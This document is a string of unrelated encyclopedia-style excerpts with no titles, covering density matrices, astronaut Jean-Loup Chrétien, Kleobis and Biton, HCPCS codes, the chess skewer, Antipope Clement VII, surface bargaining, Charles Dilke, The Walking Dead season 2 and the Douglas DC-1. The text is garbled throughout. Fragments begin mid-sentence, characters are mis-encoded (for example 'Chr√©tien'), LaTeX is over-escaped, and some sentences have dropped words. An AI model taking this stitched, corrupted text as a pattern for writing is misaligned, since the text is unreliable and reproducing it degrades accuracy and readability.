partial trace of a pure quantum state (called a purification) on a larger bipartite system H \\\\otimes K for a sufficiently large Hilbert space K. The density matrix describing a mixed state is defined to be an operator of the form :\\\\rho = \\\\sum_s p_s  \\\\psi_s \\\\rangle \\\\langle \\\\psi_s  where p_s is the fraction of the ensemble in each pure state \\\\psi_s\\\\rangle. The density matrix can be thought of as a way of using the one-particle formalism to describe the behavior of many similar particles by giving a probability distribution (or ensemble) of states that these particles can be found in. A simple criterion for checking whether a density matrix is describing a pure or mixed state is that the trace of œÅ2 is equal to 1 if the state is pure, and less than 1 if the state is mixed.Blum, Density matrix theory and applications, page 39. Another, equivalent, criterion is that the von Neumann entropy is 0 for a pure state, and strictly positive for a mixed state. The rules for measurement in quantum mechanics are particularly simple to state in terms of density matrices. For example, the ensemble average (expectation value) of a measurement corresponding to an observable A is given by :\\\\langle A \\\\rangle = \\\\sum_s p_s \\\\langle \\\\psi_s  A  \\\\psi_s \\\\rangle = \\\\sum_s \\\\sum_i p_s a_i  \\\\langle \\\\alpha_i  \\\\psi_s \\\\rangle ^2 = \\\\operatorname{tr}(\\\\rho A) where \\\\alpha_i\\\\rangle, \\\\; a_i are eigenkets and eigenvalues, respectively, for the operator A, and \\"tr\\" denotes trace. It is important to note that two types of averaging are occurring, one being a weighted quantum superposition over the basis kets \\\\psi_s\\\\rangle of the pure states, and the other being a statistical (said incoherent) average with the probabilities ps of those states. According to Eugene Wigner, Footnote 13 on p.180 the concept of mixture was put forward by Lev Landau. English translation reprinted in: p.8-18 Mathematical generalizations States can be formulated in terms of observables, rather than as vectors in a vector space. These are positive normalized linear functionals on a C*-algebra, or sometimes other classes of algebras of observables.

He was promoted to Lieutenant, and joined the 5th Fighter Squadron in Orange, in the Southeast of France, where he served for seven years as a fighter pilot in an operational squadron flying Super-Mystere B2's and then Mirage III interceptors. In 1970, he was assigned to the French test pilots school, EPNER (Ecole du Personnel Navigant d'Essais et de R√©ception), then served as a test pilot at the Istres Flight Test Center for seven years. During that time he was responsible for supervising the flight test program for the Mirage F-1 fighter. In 1977‚Äì78, he was appointed Deputy Commander of the South Air Defence Division in Aix en Provence, and he served in this position until his selection as a cosmonaut in June 1980. Chr√©tien remained a French Air Force officer but was placed on detachment to CNES for his space flight activities ensuring his availability for future flights with the Shuttle (NASA), Mir (Soviet Union) or Spacelab (ESA). He has accumulated over 8000 hours of flying time in various aircraft, including Tupolev 154, MiG-25, and Sukhoi Su-26 and Sukhoi Su-27. A veteran of three space flights, Chr√©tien was the tenth Intercosmos cosmonaut, and has spent a total of 43 days, 11 hours, 18 minutes, 42 seconds in space, including an EVA of 5 hours, 57 minutes. In April 1979, the Soviet Union offered France the opportunity to fly a cosmonaut on board a joint Soviet-French space flight, along the same lines as the agreement to fly non-Soviet cosmonauts from member countries of the Intercosmos program. The offer was accepted, and France began a spationaut selection process in September 1979. Chr√©tien was one of two finalists named on 12 June 1980. He started training at the Yuri Gagarin Cosmonaut Training Center in September 1980. The following year he was named as the Research Cosmonaut for the prime crew of the Soyuz T-6 mission. Soyuz T-6 was launched on 24 June 1982, and Chr√©tien, Dzhanibekov and Ivanchenkov linked up with Salyut 7 and joined the crew of Berezovoi and Lebedev already on board. They spent nearly seven days carrying out a program of joint Soviet-French experiments, including a series of French echography cardiovascular monitoring system experiments, before returning to Earth after a flight lasting 7 days, 21 hours, 50 minutes, 42 seconds. This flight made him the first Western non-American to go to space, as well as the first Western European. Following the mission he was appointed Chief, CNES Astronaut Office. Chr√©tien was selected as the back-up crew member for STS-51-G (Patrick Baudry, another CNES astronaut, flew on that mission). During 1984‚Äì85, he participated in mission training at the Johnson Space Center. Chr√©tien made his second space flight as a Research Cosmonaut on board Soyuz TM-7, which launched on 26 November 1988. Together with Volkov and Krikalev, he linked up with Mir and joined the crew of Titov, Manarov and Polyakov already on board. They spent 22 days carrying out a program of joint Soviet-French experiments, including a 5-hour and 57 minute EVA by Volkov and Chr√©tien during which the two men installed the French ERA experimental deployable structure and a panel of material samples. In making the EVA, he became the first non-American and non-Soviet to walk in space. In addition, he was the first non-Soviet cosmonaut to make a second space flight aboard a Soviet spacecraft. The mission lasted 24 days, 18 hours, 7 minutes. During 1990‚Äì93, Chr√©tien participated in Buran spacecraft pilot training at the Moscow Joukovski Institute. He has also flown the Tupolev 154 and MiG-25 aircraft, flying simulators equivalent to the Shuttle Training Aircraft (STA). In 1994, he was selected as part of NASA Astronaut Group 15 to officially become an International Mission Specialist with NASA. Chr√©tien attended ASCAN Training at the Johnson Space Center during 1995. He was initially assigned to work technical issues for the Operations Planning Branch of the Astronaut Office. He served on the crew of STS-86 Atlantis (25 September to 6 October 1997) the seventh mission to rendezvous and dock with the Russian Space Station Mir. Highlights included the delivery of a Mir attitude control computer, the exchange of U.S. crew members Mike Foale and David Wolf, a spacewalk by Scott Parazynski and Vladimir Titov to retrieve four experiments first deployed on Mir during the STS-76 docking mission, the transfer to Mir of 10,400 pounds of science and logistics, and the return of experiment hardware and results to Earth. Mission duration was 10 days, 19 hours, 21 minutes. In September 2000, while visiting a Home Depot store in Webster, Texas, he was hit by a drill press that fell from a shelf more than above him. The injuries to his neck, head and shoulders were severe enough that a NASA flight surgeon determined that Chr√©tien could no longer fly. He was forced to retire from the space program in 2001. He filed a $15 million lawsuit against Home Depot several months after the accident. The company settled the suit in 2002. The terms of the settlement are protected by a confidentiality agreement.Accident grounded astronaut Chr√©tien is currently working for Tietronix Software as the vice president of Research and Development in Houston, Texas.

Two statues, discovered in Delphi, represent them. The story can first be seen in Herodotus Histories (1.31), where Solon tells King of Lydia, Croesus about the happiest person in the world. Legend = Herodotus Story = The legend begins with the story of Solon, upon his meeting with Croesus. Solon was an Athenian statesman, lawmaker, and poet and Croesus was the King of Lydia who reigned for 14 years. Croesus, concerned about his legacy over the kingdom, takes the time to ask Solon who he found to be the happiest person in the world. Upon his reply, Solon names three separate people. The first being Tellus, the second and third being the brothers known as Kleobis and Biton. When hearing about this news, Croesus was confused as to why he was not considered to be one of the happiest of men. In response, Solon shares first the tale of Tellus and then the tale of Kleobis and Biton. Kleobis and Biton, painted in 1830 by Adam M√ºller In the story, Solon tells of how these Argive brothers took their mother named Cydippe, a priestess at the temple of Hera, to a festival for the goddess to be held in town. When their mother's oxen could not be found, the brothers yoked themselves to their mother's cart and drove her the six miles to the temple. Having arrived at the festival, the mother prayed for Hera to bestow a gift upon her sons for their strength and devotion, which Hera listened and rewarded the sons. When the prayers and the sacrifice were over, Kleobis and Biton fell asleep in the temple and never woke up, which was the gift Hera bestowed on the boys: allowing for them to die. To honor the two brothers, the people of Argos dedicated statues of them to the temple of Apollo at Delphi, allowing for these statues to be seen as funeral memorials. Upon hearing this story, Solon's advice to Croesus were ‚Äúthe uncertainties of life mean that no one can be completely happy.‚Äù Either one can experience the joys of having continuous prosperity, much like Tellus, or one can experience a life of death, which can be granted as a reward like it was to Kleobis and Biton. The lesson of the legend is to showcase that those who live a moderately happy life are shown to have a glamorous death. It also shows that \\"it was better for a man to die than to live.\\" = Interpretation = In the context of Herodotus' narrative, Solon is communicating to Croesus that * human happiness is not dependent on wealth (which is Croesus' view at that point), and * happiness cannot be evaluated in the case of any given person until that person has died (when the story of their life is complete). \\"Happiness\\" translates the ancient Greek word eudaimonia, which does not have to do with emotion but rather with the good fortune that a person has in life overall. Statues The twin statues by Polymedes of Argos, conventionally known as \\"Kleobis and Biton\\". = History = Herodotus records that \\"the Argives had statues of them made and set them up at Delphi, because they had been such excellent men\\". These two statues are known to be similar to other funerary monuments of the Archaic time, which were set up by the parents of the fallen warriors. The modern Delphi Museum displays two identical Archaic kouroi under the names of Cleobis and Biton, although other archaeologists who have studied the statues, see in them the twin sons of Zeus, the Dioscouri, worship of whom was quite widespread in the Peloponnese. Inscriptions on the base of the statues identify them as œúŒëŒùŒëŒöŒ©Œù (wanak≈çn), i.e. the \\"princes\\", an attribute usually given to Castor and Pollux in Argos, a fact which supported the identification with the Dioscuri. The inscription also identifies Polymedes of Argos as the sculptor: something which was very unusual at such an early date. The statues are in what is regarded as a typical Peloponnesian style: massive and muscular. Their left foot is stepping forward, whereas their hands are bent at the elbows, touching the thighs, hands closed in fists. The hair are curly over the forefront and hang on the shoulders. Their eyes are large and almond-shaped, crowned by high eyebrows. Their faces bear the typical Archaic smile. They wore high-soled sandals. Each figure stood on a different stepping stone but they were both standing on the same pedestal. The date suggested for their creation is ca. 580 BC. They are considered a typical specimen of the Archaic sculpture of the Peloponnese  Connection to Kouros Figures  These statues share a connection with the fundamentals of what a Kouros statue is, meaning that they are free-standing figures that depict the male youth that are depicted in symmetry and pattern. The earliest depiction of Kouros statues can be found in Egyptian culture, where the style of the sculpture shows stability, by being depicted by a single viewpoint in the front. Here, the two sculptures can be seen with a foot movement, to imply movement, with idealized features, from the oval eyes to the fist clenched on each side of their torsos. However, these two statues do seem to suggest that the Greeks are moving away from the strict lines of the Egyptians and are beginning to move towards the ideal of depicting more realistic figures. In Greece, Kouros \\"signifies youth and manhood, sometimes warrior status...it is related to the word koros, that signifies seedling or shoot of a plant.\\"  Description  Standing side by side, these marble statues stand on separate blocks that are supported by the same base that bears some part of an inscription on the bottom. The two statues can both be seen with one leg stepping forward, arms locked to their sides, and depicted as naked youth. Despite for the marked boots, which could be a sign of the god Apollo or the fact that they were travelers, these life-size young men are seen to be stocky in built with broad shoulders and a broad face. Their hair can be seen as a single row of large disk-like curls that line the forehead of the statues, with the rest of the hair combed then subdivided into bead-like elements that springs out from the base of the neck, with each tendril being finished off with a tie. = Heroic Nudity = In the case of Kleobis and Biton, the depiction of heroic nudity can be seen in the \\"essentially unrealistic, in so far as warriors are without clothes or body armor; yet there is still vivid interest in the postures of life deserting the heroic body.\\" In the case of the two statues, the town of Argives was not known for depicting images of Kouros images, but they two brothers who died this beautiful death were built by the enthusiastic people Argives as a message to other city-states as being an Argive citizen. Though it is still not confirmed whether or not these boys were the actual candidates for the statues, the legend does seem to fit in hand with the time of Herodotus' tale.  Athletic Depiction  Back to the legend by Solon for Kleobis and Biton, the greatest test of strength for the two young men came when they were challenged with having to take their mother to town as her oxen. The extent of their muscular depiction is emphasized to characterize them as to represent the brute strength of the Argive style, found in the High Archaic period.

History The acronym HCPCS originally stood for HCFA Common Procedure Coding System, a medical billing process used by the Centers for Medicare and Medicaid Services (CMS). Prior to 2001, CMS was known as the Health Care Financing Administration (HCFA). HCPCS was established in 1978 to provide a standardized coding system for describing the specific items and services provided in the delivery of health care. Such coding is necessary for Medicare, Medicaid, and other health insurance programs to ensure that insurance claims are processed in an orderly and consistent manner. Initially, use of the codes was voluntary, but with the implementation of the Health Insurance Portability and Accountability Act of 1996 (HIPAA) use of the HCPCS for transactions involving health care information became mandatory. Levels of codes HCPCS includes three levels of codes: *Level I consists of the American Medical Association's Current Procedural Terminology (CPT) and is numeric. *Level II codes are alphanumeric and primarily include non-physician services such as ambulance services and prosthetic devices, and represent items and supplies and non-physician services, not covered by CPT-4 codes (Level I). *Level III codes, also called local codes, were developed by state Medicaid agencies, Medicare contractors, and private insurers for use in specific programs and jurisdictions. The Health Insurance Portability and Accountability Act of 1996 (HIPAA) instructed CMS to adopt a standard coding systems for reporting medical transactions. The use of Level III codes was discontinued on December 31, 2003, in order to adhere to consistent coding standards. Level III codes were different from the modern CPT Category III codes, which were introduced in 2001 to code emerging technology.

A skewer is sometimes described as a \\"reverse pin\\"; the difference is that in a skewer, the more valuable piece is the one under direct attack. The opponent is compelled to move the more valuable piece to avoid its capture, thereby exposing the less valuable piece which can then be captured (see chess piece relative value). Only (i.e. bishops, rooks, and queens) can skewer; kings, knights, and pawns cannot. Details Compared to the pin, a passive action with only an implied threat, the skewer is a direct attack upon the more valuable piece, making it generally a much more powerful and effective tactic. The victim of a skewer often cannot avoid losing ; the only question is which material will be lost. The skewer occurs less often than the pin in actual play. When it does occur, however, it is often decisive. Skewers can be broken down into two types: absolute and relative. In an absolute skewer, the king is in check, therefore the check must be handled (under the rules of chess); whereas in a relative skewer, the pieces involved do not necessarily need to be addressed, but it is generally disadvantageous to not address the skewered piece. =Absolute skewer= In this diagram, with White to move, the white king is skewered by the black bishop. This is an absolute skewer, because the rules of chess compel White to get out of check (if possible). After White chooses one of the handful of legal moves available, Black will capture the white queen. =Relative skewer= In this diagram, with Black to move, the black queen is skewered by White's bishop. To avoid capture of the queen, Black must move the queen, and on the next move, White can capture the rook. This is a relative skewer; Black is likely to move the queen, which is more valuable than the rook‚Äîbut the choice is still available. Examples from games In the game Nigel Short‚ÄìRafael Vaganian, Barcelona 1989, White sacrifices a bishop to win a queen by a skewer. White has just played 51.Be5+ (see diagram). If Black responds 51...Kxe5 to avoid the immediate loss of the queen, 52.Qc3+ wins the queen by a skewer. Black resigned in this position.Hooper & Whyld (1996), p. 374. skewer. Defence Skewers can be escaped by gaining a tempo with a credible threat. For example, if either defending piece leaves the skewer to give check, the other can be rescued on the next move. The skewer can also be reversed into a discovered attack; if the less valuable piece can attack the skewering piece, making a threat with the more valuable piece allows the defender to capture the attacker first (if the threat does not itself drive off the attacker). If there is empty space between the skewering and the skewered pieces, it may be possible to convert the skewer into a pin by moving a lower-valued piece to intervene.

His election led to the Western Schism. The son of Amadeus III, Count of Geneva, Robert became Archbishop of Cambrai and was made a cardinal in 1371. As legate, during the War of the Eight Saints, he is said to have authorized the massacre of over 2,000 civilians at Cesena in 1377. He was elected pope the following year by the cardinals who opposed Urban VI and established himself at Avignon. Biography He was the youngest son of Amadeus III, Count of Geneva, and was born in chateau d'Annecy in 1342. Guy de Boulogne was his maternal uncle. Robert studied at La Sorbonne in Paris.

McBrien, Lives of the Popes (HarperCollins, 1997), 248. Clement had the immediate support of Queen Joanna of Naples and of several of the Italian barons. Charles V of France, who seems to have been sounded beforehand on the choice of the Roman pontiff, soon became his warmest protector. Clement eventually succeeded in winning to his cause Castile, Aragon, Navarre, a great part of the Latin East, and Flanders. Scotland supported Clement because England supported Urban.Walsh, Michael J. and Walsh, Michael. The Cardinals: Thirteen Centuries of the Men Behind the Papal Throne, Wm. B. Eerdmans Publishing, 2011, p. 157 He had adherents, besides, scattered through Germany, while Portugal on two occasions acknowledged him, but afterwards forsook him.

Williams, Papal Genealogy: The Families and Descendants of the Popes (McFarland & Company Inc., 1998), 45. Unable to maintain himself in Italy, he took up his residence at Avignon in the southern French Comtat Venaissin, where he became dependent on the French court. By the bait of a kingdom to be carved expressly out of the States of the Church and to be called the kingdom of Adria, coupled with the expectation of succeeding to Queen Joanna, Clement incited Louis I, Duke of Anjou, the eldest of the brothers of Charles V, to take arms in his favour. These tempting offers gave rise to a series of expeditions into Italy carried out almost exclusively at Clement‚Äôs expense, in the first of which Louis went to war with some 40,000 troops. The campaign was unsuccessful: Louis suddenly died at Bisceglie on 20 September 1384. Still, these enterprises on several occasions planted Angevin domination in the south of the Italian peninsula, and their most decisive result was the assuring of Provence to the dukes of Anjou and afterwards to the kings of France. After the death of Louis, Clement hoped to find equally brave and interested champions in Louis' son and namesake Louis II of Anjou, to which he donated the larger part of the Pontifical States. Clement then tried to ally with Louis I, Duke of Orl√©ans, the brother of Charles VI; with Charles VI himself; and with John III, Count of Armagnac. The prospect of his brilliant progress to Rome was ever before Clement's eyes; and in his thoughts force of arms, of French arms, was to be the instrument of his glorious triumph over his competitor. There came a time, however, when Clement and more particularly his following had to acknowledge the vanity of these elusive dreams; and at the end of his life he realized the impossibility of overcoming by brute force an opposition which was founded on the convictions of the greater part of Catholic Europe. Moreover, his ambitions and the financial needs of his court had resorted to simony, the loss of land and extortion which discerned among his adherents the germs of disaffection. He had created excellent cardinals, but he seems never to have sincerely desired the termination of the schism.Turner, William. \\"Robert of Geneva.\\" The Catholic Encyclopedia Vol. 13. New York: Robert Appleton Company, 1912. 29 May 2019 He died at Avignon on 16 September 1394. Eventually it was determined that he would be recorded as an antipope rather than as a pope. Uncertainty over who the legitimate pope might be during the time of the Western Schism gave rise to the legal theory called Conciliarism, which claimed that a general council of the church was superior to the pope and could therefore judge between rival claimants.

In this regard, it is a form of bad faith bargaining. Distinguishing surface bargaining from good faith bargaining is extremely difficult. The entire history of the negotiations must be assessed, including the party's intent, efforts made toward reaching an agreement, and any behavior which may be seen as inhibiting the bargaining process. Surface bargaining tactics may include making proposals the other party could never accept, taking inflexible or unreasonable stands on issues, and/or refusing to offer alternatives to proposals. Reneging on agreements already reached during the collective bargaining process, raising new issues late in the negotiations, or failing to follow generally accepted procedures for collective bargaining may also be seen as signs of surface bargaining. Based upon the \\"totality\\" of a party's actions during collective bargaining, surface bargaining may be found if there was a purposeful effort to avoid or frustrate mutual agreement. Under U.S. law, it is an unfair labor practice and a breach of the duty to bargain in good faith. Surface bargaining is barred under the labour law of many countries. Federal and provincial Canadian labour law bars surface bargaining, and Canadian courts have held that the test for determining surface bargaining is to look at the totality of the negotiations. In New Zealand, surface bargaining is a violation of the Employment Relations Act 2000 (as amended). A \\"Code of Good Faith\\" promulgated by the Employment Relations Authority supplements the legal statute, however, and lays out a number of rules for good faith bargaining. In the United States, surface bargaining constitutes an unfair labour practice under the National Labour Relations Act.

Touted as a future prime minister, his aspirations to higher political office were effectively terminated in 1885 after a notorious and well-publicised divorce case.

In December of that year, he entered the cabinet as President of the Local Government Board, serving until 1885. A leading and determined radical within the party, he negotiated the passage of the Third Reform Act, which the Conservatives allowed through the House of Lords, in return for a redistribution that they calculated to be marginally favourable to themselves. (The granting of the vote to agricultural labourers threatened Conservative dominance of rural seats, but many double- member seats were abolished, with seats redistributed to suburbia, where Conservative support was growing.)

Charles Dilke became the lover of Ellen Smith (his brother's mother-in-law), a relationship which continued after his marriage in 1884. In July 1885, Charles Dilke was accused of seducing Thomas Eustace Smiths' daughter Virginia Crawford ( Smith), who was his brother's sister-in-law (and his actual lover's daughter), in the first year of her marriage to Donald Crawford, another MP. That was supposed to have occurred in 1882, when Virginia was 19, and she claimed that the affair had continued on an irregular basis for the next two and a half years. Crawford sued for divorce, and the case was heard on 12 February 1886 before The Hon. Mr Justice Butt in the Probate, Divorce and Admiralty Division. Virginia Crawford was not in court, and the sole evidence was her husband's account of Virginia's confession. There were also some accounts by servants, which were both circumstantial and insubstantial. Dilke, aware of his vulnerability over the affair with Virginia's mother, refused to give evidence, largely on the advice of his confidant, Joseph Chamberlain. Butt found paradoxically that Virginia had been guilty of adultery with Dilke but that there was no admissible evidence to show that Dilke had been guilty of adultery with Virginia. He concluded, \\"I cannot see any case whatsoever against Sir Charles Dilke\\", dismissed Dilke from the suit with costs and pronounced a decree nisi dissolving the Crawfords' marriage. The paradoxical finding left doubts hanging over Dilke's respectability, and investigative journalist William Thomas Stead launched a public campaign against him. Two months later, in April, Dilke sought to reopen the case and clear his name by making the Queen's Proctor a party to the case and opposing the decree absolute.Crawford v. Crawford and Dilke (The Queen's Proctor intervening) (1886) 11 PD 150 Unfortunately, Dilke and his legal team had badly miscalculated (his legal advice has been described as \\"perhaps the worst professional advice ever given\\"). Though they had planned to subject Virginia to a searching cross-examination, Dilke, having been dismissed from the case, had no locus standi. As a consequence, it was Dilke who was subjected to severe scrutiny in the witness box by Henry Matthews. Matthews' attack was devastating, and Dilke proved an unconvincing witness. His habit of physically cutting pieces out of his diary with scissors was held up to particular ridicule, as it created the impression that he had cut out evidence of potentially embarrassing appointments. The jury found that Virginia had presented the true version of the facts and that the decree absolute should be granted. Dilke was ruined. Other women claimed he had approached them for a liaison. Various lurid rumours circulated about his love life, including that he had invited a maidservant to join himself and his lover in bed and that he had introduced one or more of them to \\"every kind of French vice\\", and he became a figure of fun in bawdy music-hall songs.Nicholls 1995, p188, 191-2 For a time it seemed that he would be tried for perjury. The accusations had a devastating effect on his political career, leading eventually to the loss of his parliamentary seat (Chelsea) in the 1886 UK general election.Jenkins (2004) Matthews gained public acclaim, winning the seat of Birmingham East as a Conservative at the same election. Queen Victoria, who approved of his performance in the trial, demanded his inclusion in Lord Salisbury's cabinet, and he was made Home Secretary. The Queen had asked in vain for Dilke to be stripped of his membership of the Privy Council. Dilke spent much of the remainder of his life and much of his fortune trying to exonerate himself, which adds weight to the view that Virginia lied about the identity of her lover. Over the years, it has been suggested that his political colleagues, including Archibald Primrose, 5th Earl of Rosebery, and Chamberlain himself, may have inspired her to accuse him, seeing him as an obstacle to their own ambitions. Dilke was largely exonerated by an inquiry in the early 1890s, which cast doubt on the truthfulness of Virginia's evidence. Her description of their alleged love nest in Warren Street was full of inaccuracies and it has been speculated that she may have been attempting to distract attention from an earlier affair with one Captain Forster. Political career after 1886 Sir Charles Dilke c. 1895 Dilke lost his Chelsea parliamentary seat at the 1886 general election.Jenkins p259 In 1889, he was approached by the Forest of Dean Liberal Association to stand as its parliamentary candidate since his radical credentials suited the mining constituency seeking employment law reform.Jenkins p376 Hoping that he could be rehabilitated as a front-line politician, Dilke consulted Liberal leader Gladstone, who discouraged him and so Dilke did not pursue the offer.Jenkins pp377-9 Three years later, however, Dilke accepted the invitation, against Gladstone's wishes and, at the 1892 general election, was duly elected as the MP for the Forest of Dean, which he held for the remainder of his life.Jenkins pp382-7 He hoped to be appointed Secretary of State for War in the Liberal Government formed in 1905, but it was not to be. Dilke attributed his exclusion to the incoming Prime Minister Henry Campbell-Bannerman's lingering resentment towards Dilke for his role in the 1895 \\"cordite vote\\", which had brought about the end of Lord Rosebery's administration in 1895.Jenkins pp410-1 In popular culture Following his death in 1911, fundraising commenced to establish a local community hospital in his Forest of Dean constituency. The Dilke Memorial Hospital, Cinderford, opened its doors for the first time in 1923 and still exists as a permanent memorial to the popular MP. Interest in Dilke was revived by Dilke: A Victorian tragedy a 1958 non-fiction work by the Labour Party politician Roy Jenkins. A 1964 West End play The Right Honourable Gentleman by Michael Dyne covers the scandal that brought Dilke down. Dilke is portrayed by Richard Leech in an episode of the 1975 ATV series Edward the Seventh. In the 1994 film Sirens, detailing sexual licence in Australia in the 1930s, the local pub is called the \\"Sir Charles Dilke\\". Arms References SourcesChamberlain, M.

Developed for television by Frank Darabont, the series is based on the eponymous series of comic books by Robert Kirkman, Tony Moore, and Charlie Adlard. It was executive produced by Darabont, Kirkman, Glen Mazzara, David Alpert, and Gale Anne Hurd, with Mazzara assuming the role of showrunner after Darabont's departure from the series. The season was well received by critics. It won Best Television Presentation at the 38th Saturn Awards and Outstanding Prosthetic Makeup for a Series, Miniseries, Movie, or Special at the 64th Primetime Creative Arts Emmy Awards. The season finale was viewed by 9 million viewers, making it the highest-rated episode of the series up to that point and the most viewed episode of an original series on AMC in history, up until the premiere of the series' third season, which was watched by 10.9 million viewers. This season adapts material from issues #7‚Äì12 of the comic book series and introduces notable comic characters Hershel Greene (Scott Wilson) and his daughter, Maggie (Lauren Cohan). Mainly set at the Greene Family Farm, after the escape and destruction of the CDC, the season continues the story of Rick Grimes (Andrew Lincoln) and his group of survivors as they continue to survive in a post-apocalyptic world overrun by flesh-eating zombies, dubbed \\"walkers\\". After leaving Atlanta, Rick and the group are stopped on the highway by a threat unlike anything they have seen before. While searching for someone who has gone missing, the group eventually discovers an isolated farm, where tensions arise among members of the main group, and the mysterious and ignorant inhabitants of the farm, whose secrets and motives are unclear. In the midst of events, Rick and the others try to restore order after a terrible discovery as differences begin to openly erupt between Rick and Shane Walsh (Jon Bernthal). Production PaleyFest in 2011 (left to right): executive producer Gale Anne Hurd, Andrew Lincoln (Rick Grimes), Sarah Wayne Callies (Lori Grimes), Jon Bernthal (Shane Walsh), Laurie Holden (Andrea), Steven Yeun (Glenn Rhee), and Emma Bell (Amy) After the first season aired, Deadline Hollywood reported that series developer and showrunner Frank Darabont had let go the entire writing staff and planned to use only freelance writers for the second season. This turned out to be not entirely accurate, and Robert Kirkman was quoted as saying the changes to the writing staff would not affect the production of the show. In February 2011, it was announced that Glen Mazzara, who had written the first-season episode \\"Wildfire\\", had been hired again as a writer/executive producer for the second season and will put together a staff of five more writers. At C2E2 members of the cast confirmed that the second season would begin shooting on June 1, 2011, and that Darabont would write the season premiere episode. At the same event, cast members speculated that acclaimed author and long-time Darabont collaborator Stephen King may write an episode. Kirkman later confirmed that along with himself, Darabont and Mazzara the writing staff will consist of Scott M. Gimple, Evan Reilly, Angela Kang and one freelance writer, David Leslie Johnson. Four actors have joined the cast as new characters for season 2‚ÄîScott Wilson as Hershel Greene, Lauren Cohan as his daughter Maggie, Pruitt Taylor Vince as Hershel's ranch hand, Otis, and Michael Zegen as Randall. A preview of season 2 was shown during the fourth-season premiere of Breaking Bad on July 17, 2011 and a full length trailer was released to promote season 2 at the San Diego Comic-Con on July 22, 2011. In July 2011, Deadline Hollywood reported that Darabont stepped down from his position as showrunner for the series, amidst rumors that he was unable to adjust to the schedule of running a television series. Executive producer Glen Mazzara succeeded Darabont as showrunner for the series. Darabont's sudden departure further sparked controversy in August when The Hollywood Reporter broke a story revealing that Darabont had in fact been fired due to issues of the show's reduced budget and a strained relationship with AMC executives. The premiere aired in an extended 90-minute time slot, similar to the pilot episode. After the first seven episodes aired, the series went on a hiatus and returned on February 12, 2012, with the final six episodes of the season airing until its conclusion on March 18, 2012. =Webisodes= Torn Apart, a six-part web series, premiered on October 3, 2011 on AMC's official website. The web series is directed by special effects makeup artist and co-executive producer Greg Nicotero and tells the origin story of Hannah, also known as \\"Bicycle Girl\\", the walker whom Rick Grimes mercy-killed in the pilot episode. =Talking Dead= Following the encore presentation of the second-season premiere on October 16, 2011, a live after- show titled Talking Dead, hosted by Chris Hardwick, premiered. The series airs after encore presentations of The Walking Dead on Sunday nights. It features host Chris Hardwick discussing the latest episode with fans, actors, and producers of the show.

On Rotten Tomatoes, the season holds an 80% with an average rating of 8.08 out of 10 based on 24 reviews. The site's critical consensus reads: \\"The second season of The Walking Dead fleshes out the characters while maintaining the grueling tension and gore that made the show a hit.\\" Linda Stasi of the New York Post wrote, \\"You'll be happy to know that at least as far as the first two episodes go ... the show is better than ever ‚Äì which would have seemed impossible.\\" Robert Bianco of USA Today also praised the direction in which the second season was heading stating that the show delivers \\"edge-of-your- chair tension\\" and noting, \\"what separates this fine series from similar shows is the honesty of its human interactions\\". Some critics were less enthused midway through the second season, including Ken Tucker of Entertainment Weekly who described the series as \\"a nighttime soap with occasional appearances by deceased but moving, flesh-rotting, flesh-eating cameo monsters\\" adding that it \\"had not been dramatic enough\\" or had a \\"tendency ... to botch truly dramatic situations\\". Nate Rawlings of TIME magazine criticized the show's pacing saying, \\"the first half of this season has been brutally slow\\". Following the season's finale, Scott Wampler of Collider.com, described the second half of the season as \\"far more intense, more interesting, better written\\" despite \\"a helluva lot of water-treading\\" in the first half. Kevin Yeoman of Screen Rant further emphasized this point: \\"It was with the last half of season 2 ‚Äì arguably the last four episodes ‚Äì where the writers succeeded in unshackling themselves from the intermittent monotony brought about by the serial nature of the show.\\" =Accolades= The second season of The Walking Dead received three nominations for the 64th Primetime Creative Arts Emmy Awards, winning Outstanding Prosthetic Makeup for a Series, Miniseries, Movie, or Special (\\"What Lies Ahead\\"), and received nominations for Outstanding Sound Editing for a Series and Outstanding Special Visual Effects (both for \\"Beside the Dying Fire\\").

Although only one example of the DC-1 was produced, the design was the basis for the DC-2 and DC-3. Design and development Development of the DC-1 can be traced back to the 1931 crash of a TWA airliner, a Fokker F.10 Trimotor in which a wing failed, probably because water had seeped between the layers of the wood laminate and dissolved the glue holding the layers together. Following the accident, the Aeronautics Branch of the U.S. Department of Commerce placed stringent restrictions on the use of wooden wings on passenger airliners.Friedman and Friedman Aeroplane Monthly May 2001, pp. 34‚Äì40.O'Leary Aeroplane Monthly February 2007, p. 71. Boeing developed an answer, the 247, a twin-engined all- metal monoplane with a retractable undercarriage, but their production capacity was reserved to meet the needs of United Airlines, part of United Aircraft and Transport Corporation which also owned Boeing. TWA needed a similar aircraft to respond to competition from the Boeing 247 and they asked five manufacturers to bid for construction of a three-engined, 12-seat aircraft of all-metal construction, capable of flying 1,080 mi (1,740 km) at 150 mph (242 km/h). The most demanding part of the specification was that the airliner would have to be capable of safely taking off from any airport on TWA's main routes (and in particular Albuquerque, at high altitude and with severe summer temperatures) with one engine non-functioning.Francillon 1979, p. 166.Pearcy Air Enthusiast 1982, p. 60. Donald Douglas was initially reluctant to participate in the invitation from TWA. He doubted that there would be a market for 100 aircraft, the number of sales necessary to cover development costs. Nevertheless, he submitted a design consisting of an all- metal, low-wing, twin-engined aircraft seating 12 passengers, a crew of two and a flight attendant. The aircraft exceeded the specifications of TWA even with only two engines, principally through the use of controllable pitch propellers.Smith (1998), p. 10 It was insulated against noise, heated, and fully capable of both flying and performing a controlled takeoff or landing on one engine. Don Douglas stated in a 1935 article on the DC-2 that the first DC-1 cost $325,000 to design and build.\\"Douglas Tells Secrets of Speed\\", Popular Mechanics, February 1935. Operational history DC-1 in TWA markings Only one aircraft was produced. The prototype made its maiden flight on July 1, 1933,Gradidge 2006, p. 9. flown by Carl Cover. It was given the model name DC-1, derived from \\"Douglas Commercial\\". During a half-year of testing, it performed more than 200 test flights and demonstrated its superiority over the most-used airliners at that time, the Ford Trimotor and Fokker Trimotor. It was flown across the United States on February 19, 1934, making the journey in the record time of 13 hours 5 minutes.Air Power History, Spring 2010, Vol. 57, No. 1, page 12, http://www.afhistory.org/wp-content/uploads/2010_Spring.pdf TWA accepted the aircraft on 15 September 1933 with a few modifications (mainly increasing seating to 14 passengers and adding more powerful engines) and subsequently ordered 20 examples of the developed production model which was named the Douglas DC-2.Gradidge 2006, p. 299. The DC-1 was sold to Lord Forbes in the United Kingdom in May 1938, who operated it for a few months before selling it in France in October 1938. It was then sold to L√≠neas A√©reas Postales Espa√±olas (L.A.P.E.) in Spain in November 1938 and was also used by the Spanish Republican Air Force as a transport aircraft.\\"Aircraft that took part in the Spanish Civil War.\\" Aircraft of the Spanish Civil War (zi.ku).

